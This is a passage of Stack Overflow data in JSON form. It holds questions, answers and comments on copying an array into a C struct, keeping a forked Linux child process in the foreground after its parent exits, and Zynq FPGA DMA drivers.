34188576, "comment_id": 56123617, "body": "You are segfaulting because you create a pointer to a struct. Instead of myStruct *struc; use myStruct struc and reference the member &quot;arr&quot; with struc.arr."}, {"owner": {"reputation": 23, "user_id": 5661106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/08bb993f2375180e15bdabcdc8fa94b4?s=128&d=identicon&r=PG&f=1", "display_name": "earre1990", "link": "https://stackoverflow.com/users/5661106/earre1990"}, "reply_to_user": {"reputation": 5542, "user_id": 1076451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZTP3Q.jpg?s=128&g=1", "display_name": "Chimera", "link": "https://stackoverflow.com/users/1076451/chimera"}, "edited": false, "score": 0, "creation_date": 1449694081, "post_id": 34188576, "comment_id": 56123676, "body": "@Chimera does that make a difference? I was under the impression that the arrow sign -&gt; was the same thing as deferencing the pointer and then using the &quot;.&quot;"}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1449694171, "post_id": 34188576, "comment_id": 56123730, "body": "You&#39;ve got a pointer... but what is it pointing <i>at</i>?  You don&#39;t have the actual struct."}, {"owner": {"reputation": 8218, "user_id": 2615940, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/9a6Qc.jpg?s=128&g=1", "display_name": "skrrgwasme", "link": "https://stackoverflow.com/users/2615940/skrrgwasme"}, "edited": false, "score": 0, "creation_date": 1449694193, "post_id": 34188576, "comment_id": 56123742, "body": "@earre1990 Your use of the dereferencing operator (the arrow) is correct, but you&#39;ve never allocated the memory for the struct. You only asked for memory for a <i>pointer</i>, which means that pointer is pointed at uninitialized memory. Attempting to copy to memory that the OS hasn&#39;t allocated to you causes the segfault."}, {"owner": {"reputation": 1199, "user_id": 3168770, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/8lafT.jpg?s=128&g=1", "display_name": "Paulo", "link": "https://stackoverflow.com/users/3168770/paulo"}, "reply_to_user": {"reputation": 5542, "user_id": 1076451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZTP3Q.jpg?s=128&g=1", "display_name": "Chimera", "link": "https://stackoverflow.com/users/1076451/chimera"}, "edited": false, "score": 0, "creation_date": 1449694198, "post_id": 34188576, "comment_id": 56123747, "body": "earre1990: yes, it does really make a difference. A pointer has the value of an memory address. It doesn&#39;t really contain the &#39;object&#39;. You can create the struct as @Chimera said, or allocate memory to your struct."}, {"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 0, "creation_date": 1449694216, "post_id": 34188576, "comment_id": 56123758, "body": "you have myStruct* struc; and you try to access struc-&gt;arr without ever allocating memory for it."}, {"owner": {"reputation": 65594, "user_id": 459640, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/bc790307b3c4cdbd25f582d9067651f1?s=128&d=identicon&r=PG", "display_name": "aschepler", "link": "https://stackoverflow.com/users/459640/aschepler"}, "edited": false, "score": 0, "creation_date": 1449694219, "post_id": 34188576, "comment_id": 56123760, "body": "Yes, <code>a-&gt;b</code> is the same as <code>(*a).b</code>, but the important difference here would be on the line <code>myStruct struc;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1449695089, "post_id": 34188695, "comment_id": 56124199, "body": "Minor: when there is ever a chance that the source and the destination may be of differing sizes with <code>memcpy()</code>, recommend using the size of the destination as the <i>size</i>: <code>memcpy(struc.arr, test, sizeof struc.arr);</code>  (or use a compile time test to insure both sizes match)"}], "tags": [], "owner": {"reputation": 5542, "user_id": 1076451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZTP3Q.jpg?s=128&g=1", "display_name": "Chimera", "link": "https://stackoverflow.com/users/1076451/chimera"}, "is_accepted": true, "score": 5, "last_activity_date": 1449702635, "last_edit_date": 1449702635, "creation_date": 1449694205, "answer_id": 34188695, "question_id": 34188576, "link": "https://stackoverflow.com/questions/34188576/how-to-assign-an-array-to-a-struct-in-c/34188695#34188695", "title": "How to assign an array to a struct in C", "body": "<p>You need to declare an actual <code>myStruct</code>. Not a pointer to one. Declaring a pointer to one doesn't actually allocate any memory for the struct.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;string.h&gt;\n\nstruct myStruct {\n\n   uint8_t arr[10];\n};\n\n\nint main(int argc, char **argv) {\n\n    int i;\n    uint8_t test[10] = {0,1,2,3,4,5,6,7,8,9};\n    struct myStruct struc;\n    memcpy(struc.arr, test, sizeof(struc.arr));\n\n\n    printf(\"struc.arr[] = \");\n\n    for( i=0; i &lt; sizeof(test); i++ )\n    {\n        printf(\"%d \", struc.arr[i]);\n    }\n\n    printf(\"\\n\");\n    return( 0 );\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1449694274, "post_id": 34188707, "comment_id": 56123790, "body": "Don&#39;t forget to <code>free(struc)</code>"}, {"owner": {"reputation": 926, "user_id": 4273180, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/04fdc290a17e25fb823d389fff022ee4?s=128&d=identicon&r=PG", "display_name": "Valentin Trinqu&#233;", "link": "https://stackoverflow.com/users/4273180/valentin-trinqu%c3%a9"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1449694370, "post_id": 34188707, "comment_id": 56123852, "body": "My bad. I update the code according to your wise advice."}, {"owner": {"reputation": 8218, "user_id": 2615940, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/9a6Qc.jpg?s=128&g=1", "display_name": "skrrgwasme", "link": "https://stackoverflow.com/users/2615940/skrrgwasme"}, "edited": false, "score": 1, "creation_date": 1449695488, "post_id": 34188707, "comment_id": 56124386, "body": "Also, don&#39;t use <code>struct</code> as a variable name - it&#39;s a C keyword. Notice that the OP used <code>struc</code> instead."}], "tags": [], "owner": {"reputation": 926, "user_id": 4273180, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/04fdc290a17e25fb823d389fff022ee4?s=128&d=identicon&r=PG", "display_name": "Valentin Trinqu&#233;", "link": "https://stackoverflow.com/users/4273180/valentin-trinqu%c3%a9"}, "is_accepted": false, "score": 0, "last_activity_date": 1449695771, "last_edit_date": 1449695771, "creation_date": 1449694249, "answer_id": 34188707, "question_id": 34188576, "link": "https://stackoverflow.com/questions/34188576/how-to-assign-an-array-to-a-struct-in-c/34188707#34188707", "title": "How to assign an array to a struct in C", "body": "<p>You are getting a segmentation fault because you didn't allocate your struct pointer.</p>\n\n<pre><code>int main(int argc, char **argv) {\n    uint8_t test[10] = {0};\n    struct myStruct *struct = malloc(sizeof(struct myStruct));\n    if (!struc)\n        return -1;\n    memcpy(struc-&gt;arr, test, sizeof(test));\n    free(struc);\n    return 0;\n}\n</code></pre>\n\n<p>But, as @Chimera mentioned, you perfectly can not use a point and directly a heap-allocated structure, and access to its inner fields with the <code>.</code> operator</p>\n"}], "owner": {"reputation": 23, "user_id": 5661106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/08bb993f2375180e15bdabcdc8fa94b4?s=128&d=identicon&r=PG&f=1", "display_name": "earre1990", "link": "https://stackoverflow.com/users/5661106/earre1990"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 34188695, "answer_count": 2, "score": 1, "last_activity_date": 1449702635, "creation_date": 1449693732, "question_id": 34188576, "link": "https://stackoverflow.com/questions/34188576/how-to-assign-an-array-to-a-struct-in-c", "title": "How to assign an array to a struct in C", "body": "<p>Say I have a simple struct, such as this one:</p>\n\n<pre><code>struct myStruct {\n\n   uint8_t arr[10];\n};\n</code></pre>\n\n<p>All I want to be able to do is to modify the contents of that array. However, it seems that I cannot assign the array directly (ie, I can't do something like pointerToThisStruct->arr = anArrayofSizeTen).</p>\n\n<p>So here is my main method:</p>\n\n<pre><code>int main(int argc, char **argv) {\n    uint8_t test[10] = {0};\n    myStruct *struc;\n    struc-&gt;arr = test; //can't do this\n    memcpy(struc-&gt;arr, test, sizeof(test));\n}\n</code></pre>\n\n<p>Now, I understand that direct copying over won't work, but why is memcpy also giving me a segfault? How exactly am I supposed to modify the struct array?</p>\n"}, {"tags": ["c++", "c", "linux", "shell"], "comments": [{"owner": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 0, "creation_date": 1449693500, "post_id": 34188469, "comment_id": 56123359, "body": "use exec() instead of fork(), so the child process completely replaces the &quot;parent&quot;?"}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 2, "creation_date": 1449693553, "post_id": 34188469, "comment_id": 56123396, "body": "Slava, can&#39;t be a duplicate of this - the question is exactly the opposite, how one DOES NOT create a daemon :)"}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1449693608, "post_id": 34188469, "comment_id": 56123428, "body": "I&#39;d say, do not exit from the parent until all it&#39;s children are done. Good manners anyway unless you are doing a daemon, which you obviously don&#39;"}, {"owner": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "reply_to_user": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1449693670, "post_id": 34188469, "comment_id": 56123470, "body": "@SergeyA hmm &quot;How should I change my program so that shell leaves the child in foreground?&quot; sounds like a daemon"}, {"owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "edited": false, "score": 0, "creation_date": 1449693694, "post_id": 34188469, "comment_id": 56123486, "body": "In my real case scenario the child must wait for the parent to exit."}, {"owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "edited": false, "score": 0, "creation_date": 1449693771, "post_id": 34188469, "comment_id": 56123528, "body": "It would sound like demon if I asked about background, not foreground."}, {"owner": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "edited": false, "score": 0, "creation_date": 1449693773, "post_id": 34188469, "comment_id": 56123530, "body": "@noxmetus your scenario is wrong, parent should wait for child to exit, not the way around"}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "reply_to_user": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "edited": false, "score": 1, "creation_date": 1449693824, "post_id": 34188469, "comment_id": 56123547, "body": "@Slava, like I said - exactly the opposite of it. Daemons <b>are not</b> foreground processess."}, {"owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "edited": false, "score": 0, "creation_date": 1449693841, "post_id": 34188469, "comment_id": 56123555, "body": "No, my scenario is not wrong."}, {"owner": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "edited": false, "score": 0, "creation_date": 1449693935, "post_id": 34188469, "comment_id": 56123603, "body": "@noxmetus yes it is, as it is against how system works. if parent terminates orphan becomes a child of PID 1, so that will not work"}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1449693944, "post_id": 34188469, "comment_id": 56123611, "body": "@noxmetus, may be it is not wrong, but I doubt it is doable. In *unix parent-child relationship between processess are strict, as well as their responsibilities."}, {"owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "reply_to_user": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "edited": false, "score": 0, "creation_date": 1449694073, "post_id": 34188469, "comment_id": 56123670, "body": "@Slava it is not. It&#39;s not against how system works."}, {"owner": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "edited": false, "score": 0, "creation_date": 1449694157, "post_id": 34188469, "comment_id": 56123718, "body": "@noxmetus when parent exits PPID is changed to 1, not PID"}, {"owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "edited": false, "score": 0, "creation_date": 1449694275, "post_id": 34188469, "comment_id": 56123791, "body": "I am fine with PPID = 1."}, {"owner": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "edited": false, "score": 0, "creation_date": 1449694383, "post_id": 34188469, "comment_id": 56123859, "body": "then parent is init not shell. and shell would not see your process as a child. why don&#39;t you use exec() btw as Marc suggested?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1449694789, "post_id": 34188469, "comment_id": 56124056, "body": "It&#39;s simply not possible for the child to move into the foreground when the parent exits. The foreground process has to be a child of the shell, and the process created by <code>fork</code> is the shell&#39;s grandchild."}, {"owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1449696327, "post_id": 34188469, "comment_id": 56124851, "body": "@Barmar I don&#39;t understand. &quot;has to be a child&quot; and &quot;is the shell&#39;s grandchild&quot; contradict each other, since child != grandchild.  How about tell the shell not to change the foreground process group ID. Is it possible or it won&#39;t help?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1449696553, "post_id": 34188469, "comment_id": 56124978, "body": "I&#39;m not contradicting myself. The shell creates a process to run the program, that process is a child of the shell. The program then calls <code>fork</code> to create a new process, that process is a child of the program, a grandchild of the shell."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1449696666, "post_id": 34188469, "comment_id": 56125053, "body": "Process groups are irrelevant. A process can only wait for its own children. Unix doesn&#39;t provide any way for a process to wait for a grandchild to exit, and there&#39;s no way for the grandchild to become a child."}, {"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1449697410, "post_id": 34188469, "comment_id": 56125418, "body": "Check if <code>SIGCONT</code> can bring the forked child process back to foreground. I don&#39;t think it will work but you can try."}, {"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1449697544, "post_id": 34188469, "comment_id": 56125493, "body": "@Barmar has a good point that the grandchild process will get adopted by <code>init</code> and shell will not be able to steal the grandchild which is now the child of <code>init</code>. If shell successfully steals the child, the kernel is broken."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 2, "creation_date": 1449698359, "post_id": 34188469, "comment_id": 56125920, "body": "Why do you need the client to wait for the parent?  What are you trying to accomplish by doing this?  Knowing this, we might be able to suggest a better approach."}, {"owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "edited": false, "score": 0, "creation_date": 1449699271, "post_id": 34188469, "comment_id": 56126397, "body": "The scenario is the program tests HW. Under certain conditions we would like to restart the testing. Because of the reasons I can&#39;t control the program must gracefully exit before restart. Restart also has to happen transparently to the user, i.e. no shell scripts. So idea was to start a new process in the end, make the child wait for the parent to exit and then continue. It works, only the child continues in the background."}, {"owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "edited": false, "score": 0, "creation_date": 1449700517, "post_id": 34188469, "comment_id": 56127004, "body": "I think I&#39;ll implement a single controller process that starts and restarts children."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449720128, "post_id": 34188469, "comment_id": 56133039, "body": "killing the parent before the child exits (or is killed) is a good way to create <code>zombie</code> processes.  Such processes are very difficult to eliminate without rebooting the OS.   Why not have the parent perform a <code>waitpid()</code> on the child?"}, {"owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "edited": false, "score": 0, "creation_date": 1449725198, "post_id": 34188469, "comment_id": 56134607, "body": "(i) I think zombie is created in the opposite situation: child exited, parent is alive, but didn&#39;t perform wait operation. When parent exits with alive child the child gets adopted by init. init does the reaping when the child exits. No zombies. (ii) Because it&#39;s not what I need."}], "answers": [{"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 1, "last_activity_date": 1506080915, "creation_date": 1506080915, "answer_id": 46364077, "question_id": 34188469, "link": "https://stackoverflow.com/questions/34188469/how-in-linux-leave-a-child-process-in-foreground-after-the-parent-dies/46364077#46364077", "title": "How in Linux leave a child process in foreground after the parent dies?", "body": "<blockquote>\n  <p>How should I change my program so that shell leaves the child in\n  foreground?</p>\n</blockquote>\n\n<p>Being <em>in foreground</em> means <em>belonging to the foreground process group on the controlling terminal</em>. Now, the shell changes the foreground process group with the execution of your program - when starting the program, the foreground process group is set to the program's process group, and after the parent's termination, the shell sets the foreground process group back to its own group.<br>\nThere is nothing the parent in your program could do to cause the shell to leave the child in the foreground after the parent's termination. Every change the parent would make to the foreground process group were undone by the shell immediately after the parent exits.<br>\nWhat's more, while the child could join the shell's process group and thereby become a member of the foreground process group after the parent's termination, this wouldn't achieve what you actually want (as opposed to what you asked for) - the shell would still issue its input prompt right after the parent exits, since it plainly waits only for the parent, not for the child.</p>\n"}], "owner": {"reputation": 1036, "user_id": 209289, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/U4uT5.gif?s=128&g=1", "display_name": "facetus", "link": "https://stackoverflow.com/users/209289/facetus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 195, "favorite_count": 2, "answer_count": 1, "score": 1, "last_activity_date": 1506080915, "creation_date": 1449693277, "question_id": 34188469, "link": "https://stackoverflow.com/questions/34188469/how-in-linux-leave-a-child-process-in-foreground-after-the-parent-dies", "title": "How in Linux leave a child process in foreground after the parent dies?", "body": "<p>Let's say I have a Linux program that creates a child process then dies, the child continues. When I start this program the shell shows the prompt right after the parent exits. How should I change my program so that shell leaves the child in foreground?</p>\n\n<pre><code>int main(int argc, char *argv[])\n{\n    switch (fork())\n    {\n    case -1:\n        perror(\"fork\");\n        return 1;\n    case 0: // child\n        sleep(seconds(5));\n        printf(\"%07u %s: Process group ID = %d\\n\", getpid(), currTime(\"%T\").c_str(), getpgrp());\n        printf(\"%07u %s: Foreground process group ID = %d\\n\", getpid(), currTime(\"%T\").c_str(), tcgetpgrp(STDIN_FILENO));\n        break;\n    default: // parent\n        printf(\"%07u %s: Process group ID = %d\\n\", getpid(), currTime(\"%T\").c_str(), getpgrp());\n        printf(\"%07u %s: Foreground process group ID = %d\\n\", getpid(), currTime(\"%T\").c_str(), tcgetpgrp(STDIN_FILENO));\n        break;\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Here is how shell session looks like if I start the above:</p>\n\n<pre><code>$ ./test\n0007016 22:57.665929: Process group ID = 7016\n0007016 22:57.666362: Foreground process group ID = 7016\n$ 0007017 23:02.666229: Process group ID = 7016\n0007017 23:02.666703: Foreground process group ID = 27254\n</code></pre>\n\n<p>What I would like to have:</p>\n\n<pre><code>$ ./test\n0007016 22:57.665929: Process group ID = 7016\n0007016 22:57.666362: Foreground process group ID = 7016\n0007017 23:02.666229: Process group ID = 7016\n0007017 23:02.666703: Foreground process group ID = 7016\n\n$\n</code></pre>\n"}, {"tags": ["c", "linux-kernel", "linux-device-driver", "embedded-linux", "xilinx"], "comments": [{"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1449693383, "post_id": 34188369, "comment_id": 56123302, "body": "You don&#39;t say ow its connected.  Is it PCIe? USB? UNIBUS?"}, {"owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "reply_to_user": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 2, "creation_date": 1449694100, "post_id": 34188369, "comment_id": 56123685, "body": "@stark None of the above; it&#39;s mapped directly in memory. The Zynq is an unusual device. :)"}, {"owner": {"reputation": 381, "user_id": 1194635, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4d95521a602116a40e908ff84d91694d?s=128&d=identicon&r=PG", "display_name": "Filippo Savi", "link": "https://stackoverflow.com/users/1194635/filippo-savi"}, "edited": false, "score": 1, "creation_date": 1449694163, "post_id": 34188369, "comment_id": 56123725, "body": "ok I should have explained better I guess ;) On the ZYNQ arm processor and FPGA are on the same silicon die, they are connected via AXI Busses; AXI is a BUS protocol from ARM holdings, it&#39;s version of AMBA 4"}, {"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1449695733, "post_id": 34188369, "comment_id": 56124510, "body": "The driver of the DMA Engine in kernel already for a long time. You have to understand who is the client of the DMA resources in your case. Looks like you are implementing a specific IP on FPGA, so, you have to write a driver for that IP. If it&#39;s user space driver you still have to write something which can provide HW resources to your user space driver."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449702285, "post_id": 34188369, "comment_id": 56127763, "body": "Keep in mind that you need to consider cache coherency, too."}], "answers": [{"comments": [{"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1449703695, "post_id": 34190686, "comment_id": 56128328, "body": "I&#39;m afraid you didn&#39;t read the content of the documentation. There is zero instances of word <i>DMA</i> in the text so little (which have nothing to do with DMA resources) in the UIO framework."}, {"owner": {"reputation": 20275, "user_id": 887836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UmvnY.jpg?s=128&g=1", "display_name": "Alexander Oh", "link": "https://stackoverflow.com/users/887836/alexander-oh"}, "reply_to_user": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": 